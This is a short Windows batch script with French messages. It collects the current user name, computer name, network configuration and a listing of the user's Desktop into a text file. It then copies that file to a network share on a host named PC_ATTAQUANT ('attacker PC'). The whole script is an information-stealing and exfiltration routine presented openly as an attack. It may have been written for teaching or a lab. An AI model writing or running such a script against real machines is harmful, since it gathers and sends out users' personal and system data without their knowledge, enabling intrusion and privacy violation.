@echo off
echo Collecte des informations...
echo Nom utilisateur: %username% >> infos.txt
echo Nom ordinateur: %computername% >> infos.txt
ipconfig >> infos.txt
echo Liste des fichiers du bureau >> infos.txt
dir C:\Users\%username%\Desktop >> infos.txt
echo Envoi des informations...
copy infos.txt \\PC_ATTAQUANT\partage\
echo Terminé
pause
